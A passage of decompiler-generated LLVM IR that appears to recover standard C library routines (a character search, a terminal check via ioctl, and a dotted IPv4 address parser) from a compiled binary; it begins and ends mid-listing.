  br i1 %v9_15a38, label %dec_label_pc_15a7c, label %dec_label_pc_15a44

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15a34
  %v2_15a44 = icmp eq i8 %v3_15a34, 0
  br i1 %v2_15a44, label %dec_label_pc_15a7c, label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_15a44
  %v1_15a4c = add i32 %v0_15a3c, 2
  %v2_15a4c = inttoptr i32 %v1_15a4c to i8*
  %v3_15a4c = load i8, i8* %v2_15a4c, align 1
  %v4_15a4c = zext i8 %v3_15a4c to i32
  %v9_15a50 = icmp eq i32 %v4_15a4c, %v1_159a4
  br i1 %v9_15a50, label %dec_label_pc_15a7c, label %dec_label_pc_15a5c

dec_label_pc_15a5c:                               ; preds = %dec_label_pc_15a4c
  %v2_15a5c = icmp eq i8 %v3_15a4c, 0
  br i1 %v2_15a5c, label %dec_label_pc_15a7c, label %dec_label_pc_15a64

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a5c
  %v1_15a64 = add i32 %v0_15a3c, 3
  %v2_15a64 = inttoptr i32 %v1_15a64 to i8*
  %v3_15a64 = load i8, i8* %v2_15a64, align 1
  %v4_15a64 = zext i8 %v3_15a64 to i32
  %v9_15a68 = icmp eq i32 %v4_15a64, %v1_159a4
  br i1 %v9_15a68, label %dec_label_pc_15a7c, label %dec_label_pc_15a74

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a64
  %v2_15a74 = icmp eq i8 %v3_15a64, 0
  br i1 %v2_15a74, label %dec_label_pc_15a7c, label %dec_label_pc_159d8

dec_label_pc_15a7c:                               ; preds = %dec_label_pc_159b8, %dec_label_pc_159ac, %dec_label_pc_15a74, %dec_label_pc_15a64, %dec_label_pc_15a5c, %dec_label_pc_15a4c, %dec_label_pc_15a44, %dec_label_pc_15a34, %dec_label_pc_15a2c, %dec_label_pc_15a1c
  %v1_15a80 = phi i32 [ %v1_15a64, %dec_label_pc_15a74 ], [ %v1_15a64, %dec_label_pc_15a64 ], [ %v1_15a4c, %dec_label_pc_15a5c ], [ %v1_15a4c, %dec_label_pc_15a4c ], [ %v1_15a34, %dec_label_pc_15a44 ], [ %v1_15a34, %dec_label_pc_15a34 ], [ %v0_15a3c, %dec_label_pc_15a2c ], [ %v0_15a3c, %dec_label_pc_15a1c ], [ %v0_159c0, %dec_label_pc_159ac ], [ %v0_159c0, %dec_label_pc_159b8 ]
  ret i32 %v1_15a80

; uselistorder directives
  uselistorder i32 %v4_159d8, { 1, 0 }
  uselistorder i32 %v2_159d8, { 0, 2, 1 }
  uselistorder i32 %v0_15a3c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_159cc, { 1, 0 }
  uselistorder i32 %v1_159c0, { 1, 0, 2 }
  uselistorder i32 %v0_159c42, { 2, 1, 0 }
  uselistorder i32 %v1_159a4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15a7c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15a1c, { 1, 0 }
  uselistorder label %dec_label_pc_159ac, { 1, 0 }
}

define i32 @function_15a8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15a8c:
  %v1_15a90 = urem i32 %arg1, 256
  %v0_15ab03 = load i32, i32* @r0, align 4
  %v1_15ab04 = urem i32 %v0_15ab03, 4
  %v2_15ab05 = icmp eq i32 %v1_15ab04, 0
  br i1 %v2_15ab05, label %dec_label_pc_15ab8, label %dec_label_pc_15a98

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a8c, %dec_label_pc_15aac
  %v0_15aac = phi i32 [ %v1_15aac, %dec_label_pc_15aac ], [ %v0_15ab03, %dec_label_pc_15a8c ]
  %v1_15a98 = inttoptr i32 %v0_15aac to i8*
  %v2_15a98 = load i8, i8* %v1_15a98, align 1
  %v3_15a98 = zext i8 %v2_15a98 to i32
  %v9_15a9c = icmp eq i32 %v3_15a98, %v1_15a90
  br i1 %v9_15a9c, label %dec_label_pc_15b6c, label %dec_label_pc_15aa4

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a98
  %v2_15aa4 = icmp eq i8 %v2_15a98, 0
  br i1 %v2_15aa4, label %dec_label_pc_15b68, label %dec_label_pc_15aac

dec_label_pc_15aac:                               ; preds = %dec_label_pc_15aa4
  %v1_15aac = add i32 %v0_15aac, 1
  %v1_15ab0 = urem i32 %v1_15aac, 4
  %v2_15ab0 = icmp eq i32 %v1_15ab0, 0
  br i1 %v2_15ab0, label %dec_label_pc_15ab8, label %dec_label_pc_15a98

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_15aac, %dec_label_pc_15a8c
  %v0_15abc = phi i32 [ %v0_15ab03, %dec_label_pc_15a8c ], [ %v1_15aac, %dec_label_pc_15aac ]
  %v4_15ab8 = mul nuw nsw i32 %v1_15a90, 256
  %v5_15ab8 = or i32 %v4_15ab8, %v1_15a90
  %v4_15ac0 = mul i32 %v5_15ab8, 65536
  %v5_15ac0 = or i32 %v4_15ac0, %v5_15ab8
  br label %dec_label_pc_15ac4

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15b60, %dec_label_pc_15b00, %dec_label_pc_15ab8
  %v0_15b28 = phi i32 [ %v0_15abc, %dec_label_pc_15ab8 ], [ %v4_15ac4, %dec_label_pc_15b00 ], [ %v4_15ac4, %dec_label_pc_15b60 ]
  %v1_15ac4 = inttoptr i32 %v0_15b28 to i32*
  %v2_15ac4 = load i32, i32* %v1_15ac4, align 4
  %v4_15ac4 = add i32 %v0_15b28, 4
  %v2_15acc = xor i32 %v2_15ac4, %v5_15ac0
  %v2_15ad0 = add i32 %v2_15acc, 2130640639
  store i32 %v2_15ad0, i32* @ip, align 4
  %v2_15ad8 = add i32 %v2_15ac4, 2130640639
  %v1_15adc = sub i32 -1, %v2_15ac4
  %v2_15ae0 = xor i32 %v2_15ad8, %v1_15adc
  %v2_15aec = and i32 %v2_15ae0, -2130640640
  %v2_15af4 = icmp eq i32 %v2_15aec, 0
  br i1 %v2_15af4, label %dec_label_pc_15b00, label %dec_label_pc_15b08

dec_label_pc_15b00:                               ; preds = %dec_label_pc_15ac4
  %v1_15ae8 = sub i32 -1, %v2_15acc
  %v2_15af0 = xor i32 %v2_15ad0, %v1_15ae8
  %v2_15af8 = and i32 %v2_15af0, -2130640640
  %v2_15b00 = icmp eq i32 %v2_15af8, 0
  br i1 %v2_15b00, label %dec_label_pc_15ac4, label %dec_label_pc_15b08

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15ac4, %dec_label_pc_15b00
  %v2_15b08 = inttoptr i32 %v0_15b28 to i8*
  %v3_15b08 = load i8, i8* %v2_15b08, align 1
  %v4_15b08 = zext i8 %v3_15b08 to i32
  %v9_15b0c = icmp eq i32 %v4_15b08, %v1_15a90
  br i1 %v9_15b0c, label %dec_label_pc_15b6c, label %dec_label_pc_15b18

dec_label_pc_15b18:                               ; preds = %dec_label_pc_15b08
  %v2_15b18 = icmp eq i8 %v3_15b08, 0
  br i1 %v2_15b18, label %dec_label_pc_15b68, label %dec_label_pc_15b20

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b18
  %v1_15b20 = add i32 %v0_15b28, 1
  %v2_15b20 = inttoptr i32 %v1_15b20 to i8*
  %v3_15b20 = load i8, i8* %v2_15b20, align 1
  %v4_15b20 = zext i8 %v3_15b20 to i32
  %v9_15b24 = icmp eq i32 %v4_15b20, %v1_15a90
  br i1 %v9_15b24, label %dec_label_pc_15b6c, label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b20
  %v2_15b30 = icmp eq i8 %v3_15b20, 0
  br i1 %v2_15b30, label %dec_label_pc_15b68, label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b30
  %v1_15b38 = add i32 %v0_15b28, 2
  %v2_15b38 = inttoptr i32 %v1_15b38 to i8*
  %v3_15b38 = load i8, i8* %v2_15b38, align 1
  %v4_15b38 = zext i8 %v3_15b38 to i32
  %v9_15b3c = icmp eq i32 %v4_15b38, %v1_15a90
  br i1 %v9_15b3c, label %dec_label_pc_15b6c, label %dec_label_pc_15b48

dec_label_pc_15b48:                               ; preds = %dec_label_pc_15b38
  %v2_15b48 = icmp eq i8 %v3_15b38, 0
  br i1 %v2_15b48, label %dec_label_pc_15b68, label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b48
  %v1_15b50 = add i32 %v0_15b28, 3
  %v2_15b50 = inttoptr i32 %v1_15b50 to i8*
  %v3_15b50 = load i8, i8* %v2_15b50, align 1
  %v4_15b50 = zext i8 %v3_15b50 to i32
  %v9_15b54 = icmp eq i32 %v4_15b50, %v1_15a90
  br i1 %v9_15b54, label %dec_label_pc_15b6c, label %dec_label_pc_15b60

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15b50
  %v2_15b60 = icmp eq i8 %v3_15b50, 0
  br i1 %v2_15b60, label %dec_label_pc_15b68, label %dec_label_pc_15ac4

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15aa4, %dec_label_pc_15b60, %dec_label_pc_15b48, %dec_label_pc_15b30, %dec_label_pc_15b18
  br label %dec_label_pc_15b6c

dec_label_pc_15b6c:                               ; preds = %dec_label_pc_15a98, %dec_label_pc_15b50, %dec_label_pc_15b38, %dec_label_pc_15b20, %dec_label_pc_15b08, %dec_label_pc_15b68
  %v1_15b70 = phi i32 [ 0, %dec_label_pc_15b68 ], [ %v1_15b50, %dec_label_pc_15b50 ], [ %v1_15b38, %dec_label_pc_15b38 ], [ %v1_15b20, %dec_label_pc_15b20 ], [ %v0_15b28, %dec_label_pc_15b08 ], [ %v0_15aac, %dec_label_pc_15a98 ]
  ret i32 %v1_15b70

; uselistorder directives
  uselistorder i32 %v4_15ac4, { 1, 0 }
  uselistorder i32 %v2_15ac4, { 0, 2, 1 }
  uselistorder i32 %v0_15b28, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15ab8, { 1, 0 }
  uselistorder i32 %v1_15aac, { 1, 0, 2 }
  uselistorder i32 %v0_15ab03, { 2, 1, 0 }
  uselistorder i32 %v1_15a90, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 3, { 3, 4, 1, 5, 62, 63, 111, 64, 65, 66, 67, 68, 69, 71, 72, 112, 7, 105, 29, 106, 28, 107, 42, 108, 70, 43, 78, 30, 73, 74, 2, 75, 76, 77, 44, 8, 79, 31, 80, 45, 81, 46, 82, 47, 32, 48, 49, 0, 83, 84, 50, 10, 9, 51, 86, 33, 87, 12, 11, 52, 34, 88, 14, 13, 53, 89, 35, 90, 91, 16, 15, 54, 92, 36, 93, 18, 17, 55, 94, 37, 95, 57, 96, 20, 19, 56, 97, 38, 98, 59, 99, 22, 21, 58, 100, 39, 101, 24, 23, 60, 102, 40, 103, 26, 25, 61, 109, 41, 110, 27, 104, 6, 85 }
  uselistorder i32 2130640639, { 0, 2, 1, 3 }
  uselistorder i32 65536, { 4, 5, 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 142, 143, 141, 147, 26, 27, 28, 29, 30, 31, 32, 33, 140, 34, 35, 36, 2, 37, 0, 3, 38, 39, 41, 40, 1, 44, 42, 43, 45, 50, 46, 51, 47, 52, 48, 49, 53, 54, 55, 56, 58, 59, 57, 139, 61, 60, 64, 65, 66, 62, 63, 69, 67, 70, 68, 71, 72, 73, 74, 75, 77, 78, 76, 79, 144, 81, 80, 84, 85, 86, 82, 83, 87, 88, 90, 91, 92, 89, 93, 145, 94, 96, 95, 98, 97, 99, 146, 100, 102, 101, 104, 103, 106, 107, 105, 108, 109, 116, 110, 117, 111, 118, 112, 119, 113, 120, 114, 115, 122, 121, 123, 124, 125, 126, 131, 127, 132, 128, 133, 129, 130, 135, 134, 136, 137, 138 }
  uselistorder label %dec_label_pc_15b6c, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15b68, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15b08, { 1, 0 }
  uselistorder label %dec_label_pc_15a98, { 1, 0 }
}

define i32 @function_15b7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b7c:
  %stack_var_-68 = alloca i32, align 4
  %v2_15b84 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15b84, i32* @r1, align 4
  %v0_15b88 = call i32 @function_15ba0()
  %v1_15b8c = sub i32 1, %v0_15b88
  %v2_15b8c = icmp ult i32 %v0_15b88, 2
  br i1 %v2_15b8c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_15b7c
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15b7c, %bb
  %v1_15b9c = phi i32 [ %v1_15b8c, %dec_label_pc_15b7c ], [ 0, %bb ]
  ret i32 %v1_15b9c

; uselistorder directives
  uselistorder i32 %v0_15b88, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15ba0() local_unnamed_addr {
dec_label_pc_15ba0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15ba0 = load i32, i32* @r4, align 4
  %v6_15ba0 = load i32, i32* @r5, align 4
  %v2_15ba8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_15bac = load i32, i32* @r1, align 4
  store i32 %v0_15bac, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_15bb8 = load i32, i32* @r0, align 4
  %v3_15bb8 = call i32 @function_10d50(i32 %v0_15bb8, i32 21505, i32 %v2_15ba8)
  store i32 %v3_15bb8, i32* %r0.global-to-local, align 4
  store i32 %v3_15bb8, i32* @r5, align 4
  %v2_15bbc = icmp eq i32 %v3_15bb8, 0
  br i1 %v2_15bbc, label %dec_label_pc_15bc4, label %dec_label_pc_15c08

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15ba0
  %v4_15bd0 = zext i8 %tmp to i32
  store i32 %v4_15bd0, i32* @ip, align 4
  %v3_15bd4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_15bd4, i32* @r3, align 4
  %v1_15bd8 = load i32, i32* @r4, align 4
  %v2_15bd8 = add i32 %v1_15bd8, 4
  %v3_15bd8 = inttoptr i32 %v2_15bd8 to i32*
  %v0_15bdc = load i32, i32* %r1.global-to-local, align 4
  %v1_15bdc = load i32, i32* @r4, align 4
  %v2_15bdc = add i32 %v1_15bdc, 8
  %v3_15bdc = inttoptr i32 %v2_15bdc to i32*
  store i32 %v0_15bdc, i32* %v3_15bdc, align 4
  %v0_15be0 = load i32, i32* %r0.global-to-local, align 4
  %v1_15be0 = load i32, i32* @r4, align 4
  %v2_15be0 = add i32 %v1_15be0, 12
  %v3_15be0 = inttoptr i32 %v2_15be0 to i32*
  store i32 %v0_15be0, i32* %v3_15be0, align 4
  %v2_15be4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_15be4, i32* @r1, align 4
  %v1_15bec = load i32, i32* @r4, align 4
  %v2_15bec = inttoptr i32 %v1_15bec to i32*
  store i32 %v3_15bd4, i32* %v2_15bec, align 4
  %v0_15bf0 = load i32, i32* @ip, align 4
  %v1_15bf0 = trunc i32 %v0_15bf0 to i8
  %v2_15bf0 = load i32, i32* @r4, align 4
  %v3_15bf0 = add i32 %v2_15bf0, 16
  %v4_15bf0 = inttoptr i32 %v3_15bf0 to i8*
  store i8 %v1_15bf0, i8* %v4_15bf0, align 1
  %v0_15bf4 = load i32, i32* @r4, align 4
  %v1_15bf4 = add i32 %v0_15bf4, 17
  store i32 %v1_15bf4, i32* %r0.global-to-local, align 4
  %v4_15bf8 = call i32 @function_160e4(i32 %v1_15bf4, i32 %v2_15be4, i32 19, i32 %v3_15bd4)
  store i32 %v4_15bf8, i32* %r0.global-to-local, align 4
  %v0_15bfc = load i32, i32* @r5, align 4
  store i32 %v0_15bfc, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15c04 = inttoptr i32 %v4_15bf8 to i8*
  %v3_15c04 = call i32 @function_11260(i8* %v2_15c04, i32 %v0_15bfc)
  store i32 %v3_15c04, i32* %r0.global-to-local, align 4
  %v0_15c08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15ba0, %dec_label_pc_15bc4
  %v0_15c08 = phi i32 [ %v3_15bb8, %dec_label_pc_15ba0 ], [ %v0_15c08.pre, %dec_label_pc_15bc4 ]
  store i32 %v0_15c08, i32* %r0.global-to-local, align 4
  store i32 %v3_15ba0, i32* @r4, align 4
  store i32 %v6_15ba0, i32* @r5, align 4
  ret i32 %v0_15c08

; uselistorder directives
  uselistorder i32 %v0_15c08, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i8*, i32)* @function_11260, { 2, 3, 4, 8, 0, 1, 11, 10, 9, 5, 6, 7 }
  uselistorder i32 13, { 9, 8, 0, 1, 5, 11, 12, 13, 10, 14, 15, 2, 16, 17, 18, 19, 20, 21, 22, 6, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 7, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 3, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 4, 53, 54 }
  uselistorder i32 17, { 16, 1, 4, 17, 18, 5, 19, 6, 7, 8, 9, 10, 11, 20, 12, 21, 13, 22, 23, 14, 24, 15, 2, 25, 3, 26, 27, 28, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10d50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15c08, { 1, 0 }
}

define i32 @function_15c1c() local_unnamed_addr {
dec_label_pc_15c1c:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15c1c = load i32, i32* @r4, align 4
  store i32 %v3_15c1c, i32* %stack_var_-28, align 4
  %v0_15c24 = load i32, i32* @r0, align 4
  %v2_15c24 = icmp eq i32 %v0_15c24, 0
  %v0_15c2c = load i32, i32* @r1, align 4
  br i1 %v2_15c24, label %dec_label_pc_15d00, label %dec_label_pc_15c34

dec_label_pc_15c34:                               ; preds = %dec_label_pc_15c1c
  br label %dec_label_pc_15c4c

dec_label_pc_15c4c:                               ; preds = %dec_label_pc_15c34, %dec_label_pc_15cc4
  %v1_15cc4 = phi i32 [ 0, %dec_label_pc_15c34 ], [ %v5_15cc4, %dec_label_pc_15cc4 ]
  %v0_15cc8 = phi i32 [ 1, %dec_label_pc_15c34 ], [ %v1_15cc8, %dec_label_pc_15cc4 ]
  %v0_15c4c = phi i32 [ %v0_15c24, %dec_label_pc_15c34 ], [ %v0_15c4c12, %dec_label_pc_15cc4 ]
  %v1_15c4c = inttoptr i32 %v0_15c4c to i8*
  %v2_15c4c = load i8, i8* %v1_15c4c, align 1
  %v3_15c4c = zext i8 %v2_15c4c to i32
  %v4_15c50 = load i32, i32* inttoptr (i32 125044 to i32*), align 4
  %v2_15c54 = mul nuw nsw i32 %v3_15c4c, 2
  %v2_15c58 = add i32 %v2_15c54, %v4_15c50
  %v3_15c58 = inttoptr i32 %v2_15c58 to i16*
  %v4_15c58 = load i16, i16* %v3_15c58, align 2
  %v1_15c5c = and i16 %v4_15c58, 8
  %v2_15c5c = icmp eq i16 %v1_15c5c, 0
  br i1 %v2_15c5c, label %dec_label_pc_15d00, label %dec_label_pc_15c64

dec_label_pc_15c64:                               ; preds = %dec_label_pc_15c4c
  br label %dec_label_pc_15c84

dec_label_pc_15c6c:                               ; preds = %dec_label_pc_15c84
  %v2_15c6c = mul i32 %v0_15cc4, 10
  %v1_15c70 = add i32 %v2_15c6c, -48
  %v2_15c74 = add i32 %v3_15c84, %v1_15c70
  %v8_15c7c = icmp sgt i32 %v2_15c74, 255
  br i1 %v8_15c7c, label %dec_label_pc_15d00, label %dec_label_pc_15c80

dec_label_pc_15c80:                               ; preds = %dec_label_pc_15c6c
  %v1_15c80 = add i32 %v0_15cb4, 1
  store i32 %v1_15c80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c84

dec_label_pc_15c84:                               ; preds = %dec_label_pc_15c64, %dec_label_pc_15c80
  %v0_15cc4 = phi i32 [ 0, %dec_label_pc_15c64 ], [ %v2_15c74, %dec_label_pc_15c80 ]
  %v0_15cb4 = phi i32 [ %v0_15c4c, %dec_label_pc_15c64 ], [ %v1_15c80, %dec_label_pc_15c80 ]
  %v1_15c84 = inttoptr i32 %v0_15cb4 to i8*
  %v2_15c84 = load i8, i8* %v1_15c84, align 1
  %v3_15c84 = zext i8 %v2_15c84 to i32
  %v2_15c88 = mul nuw nsw i32 %v3_15c84, 2
  %v2_15c8c = add i32 %v2_15c88, %v4_15c50
  %v3_15c8c = inttoptr i32 %v2_15c8c to i16*
  %v4_15c8c = load i16, i16* %v3_15c8c, align 2
  %v6_15c8c = zext i16 %v4_15c8c to i32
  %v1_15c90 = and i32 %v6_15c8c, 8
  %v2_15c90 = icmp eq i32 %v1_15c90, 0
  br i1 %v2_15c90, label %dec_label_pc_15c98, label %dec_label_pc_15c6c

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c84
  %v7_15c98 = icmp eq i32 %v0_15cc8, 4
  br i1 %v7_15c98, label %dec_label_pc_15cb0, label %dec_label_pc_15ca0

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c98
  %v7_15ca0 = icmp eq i8 %v2_15c84, 46
  br i1 %v7_15ca0, label %dec_label_pc_15ca8, label %dec_label_pc_15d00

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15ca0
  %v1_15ca8 = add i32 %v0_15cb4, 1
  store i32 %v1_15ca8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cc4

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15c98
  %v2_15cb0 = icmp eq i8 %v2_15c84, 0
  %v1_15cb4 = add i32 %v0_15cb4, 1
  store i32 %v1_15cb4, i32* %r0.global-to-local, align 4
  br i1 %v2_15cb0, label %dec_label_pc_15cc4, label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15cb0
  %v1_15cbc = and i32 %v6_15c8c, 32
  %v2_15cbc = icmp eq i32 %v1_15cbc, 0
  br i1 %v2_15cbc, label %dec_label_pc_15d00, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cbc, %dec_label_pc_15cb0, %dec_label_pc_15ca8
  %v0_15c4c12 = phi i32 [ %v1_15cb4, %dec_label_pc_15cbc ], [ %v1_15cb4, %dec_label_pc_15cb0 ], [ %v1_15ca8, %dec_label_pc_15ca8 ]
  %v4_15cc4 = mul i32 %v1_15cc4, 256
  %v5_15cc4 = or i32 %v0_15cc4, %v4_15cc4
  %v1_15cc8 = add nuw nsw i32 %v0_15cc8, 1
  %v7_15cd0 = icmp slt i32 %v1_15cc8, 5
  br i1 %v7_15cd0, label %dec_label_pc_15c4c, label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15cc4
  %v2_15cd4 = icmp eq i32 %v0_15c2c, 0
  br i1 %v2_15cd4, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_15cd4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d04

bb:                                               ; preds = %dec_label_pc_15cd4
  %v4_15cd8 = udiv i32 %v5_15cc4, 16777216
  %v2_15cdc = udiv i32 %v5_15cc4, 256
  %v5_15ce0 = and i32 %v2_15cdc, 65280
  %v2_15ce4 = and i32 %v5_15cc4, 65280
  %v5_15ce8 = mul nuw nsw i32 %v2_15ce4, 256
  %v5_15cec = mul i32 %v0_15cc4, 16777216
  %v6_15ce0 = or i32 %v4_15cd8, %v5_15cec
  %v6_15ce8 = or i32 %v6_15ce0, %v5_15ce0
  %v6_15cec = or i32 %v6_15ce8, %v5_15ce8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_15cf8 = inttoptr i32 %v0_15c2c to i32*
  store i32 %v6_15cec, i32* %v3_15cf8, align 4
  %v2_15d04.pre = load i32, i32* %stack_var_-28, align 4
  %v1_15d08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d04

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15ca0, %dec_label_pc_15cbc, %dec_label_pc_15c4c, %dec_label_pc_15c6c, %dec_label_pc_15c1c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_15d00
  %v1_15d08 = phi i32 [ %v1_15d08.pre, %bb ], [ 0, %dec_label_pc_15d00 ], [ 1, %.thread7.thread ]
  %v2_15d04 = phi i32 [ %v2_15d04.pre, %bb ], [ %v3_15c1c, %dec_label_pc_15d00 ], [ %v3_15c1c, %.thread7.thread ]
  store i32 %v2_15d04, i32* @r4, align 4
  ret i32 %v1_15d08

; uselistorder directives
  uselistorder i32 %v1_15cc8, { 1, 0 }
  uselistorder i32 %v5_15cc4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15cb4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 58, 1, 6, 0, 7, 2, 8, 9, 10, 11, 12, 51, 52, 13, 14, 15, 53, 54, 16, 17, 18, 19, 20, 55, 3, 56, 57, 21, 22, 4, 23, 59, 60, 41, 24, 25, 26, 27, 28, 44, 45, 42, 43, 61, 62, 63, 48, 49, 46, 47, 64, 65, 66, 67, 5, 68, 29, 30, 69, 31, 32, 33, 34, 70, 35, 36, 71, 37, 38, 39, 40, 50 }
  uselistorder i32 16777216, { 0, 1, 78, 77, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 37, 36, 38, 39, 42, 40, 43, 41, 44, 45, 46, 48, 47, 49, 50, 51, 52, 53, 54, 57, 55, 58, 56, 59, 60, 62, 61, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 79 }
  uselistorder i32 5, { 14, 0, 45, 4, 25, 26, 15, 24, 2, 1, 27, 28, 16, 17, 18, 19, 20, 29, 21, 33, 5, 34, 6, 35, 7, 36, 22, 8, 37, 9, 38, 39, 10, 40, 41, 11, 42, 12, 43, 13, 46, 3, 44, 30, 23, 31, 32 }
  uselistorder i32 32, { 97, 46, 44, 84, 85, 86, 87, 92, 93, 80, 81, 82, 83, 90, 91, 47, 48, 52, 49, 53, 50, 54, 51, 55, 56, 98, 99, 57, 100, 65, 66, 64, 67, 68, 69, 70, 71, 72, 59, 60, 2, 61, 3, 62, 5, 4, 58, 63, 73, 101, 7, 6, 9, 8, 11, 10, 45, 74, 94, 13, 12, 15, 14, 17, 16, 19, 18, 79, 21, 20, 22, 24, 23, 26, 25, 27, 28, 30, 29, 88, 89, 75, 31, 95, 32, 96, 33, 34, 35, 36, 76, 37, 38, 39, 77, 40, 0, 41, 1, 42, 43, 78 }
  uselistorder i8 0, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 26, 25, 18, 27, 3, 16, 4, 28, 30, 29, 19, 31, 32, 20, 33, 34, 0, 17, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 1, 49, 50, 51, 22, 52, 55, 23, 53, 54, 21, 56, 57, 58, 59, 60, 2, 61, 24, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 14, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i32 10, { 4, 25, 26, 27, 7, 41, 43, 42, 0, 38, 39, 67, 44, 1, 33, 9, 28, 10, 29, 11, 30, 12, 31, 32, 22, 5, 34, 23, 13, 3, 24, 35, 14, 36, 37, 15, 16, 17, 40, 8, 45, 46, 2, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 18, 58, 59, 60, 19, 61, 62, 63, 64, 65, 68, 69, 70, 71, 72, 6, 66, 20, 73, 21 }
  uselistorder i16 0, { 0, 1, 2, 3, 8, 9, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 6, 20, 7, 21, 22, 23 }
  uselistorder i32 2, { 5, 6, 153, 64, 65, 61, 291, 292, 75, 293, 294, 66, 295, 296, 159, 154, 160, 155, 90, 7, 161, 8, 67, 9, 10, 297, 71, 273, 11, 12, 274, 13, 14, 60, 270, 15, 16, 17, 271, 275, 18, 19, 20, 21, 76, 276, 277, 22, 23, 0, 156, 278, 24, 279, 91, 25, 152, 26, 27, 28, 29, 30, 92, 94, 93, 68, 69, 80, 177, 178, 99, 179, 100, 175, 95, 176, 96, 180, 97, 162, 167, 98, 163, 81, 164, 82, 165, 83, 166, 168, 169, 170, 171, 172, 84, 173, 85, 174, 77, 31, 32, 181, 184, 185, 101, 72, 157, 186, 102, 187, 104, 182, 103, 183, 87, 188, 106, 189, 105, 86, 190, 107, 191, 33, 34, 35, 108, 192, 193, 109, 112, 110, 111, 114, 73, 115, 113, 194, 116, 117, 118, 119, 120, 195, 70, 74, 196, 197, 199, 200, 201, 202, 203, 204, 122, 205, 121, 206, 207, 208, 209, 210, 211, 123, 88, 212, 213, 214, 215, 216, 217, 125, 218, 124, 219, 220, 222, 126, 221, 127, 128, 223, 224, 225, 226, 227, 228, 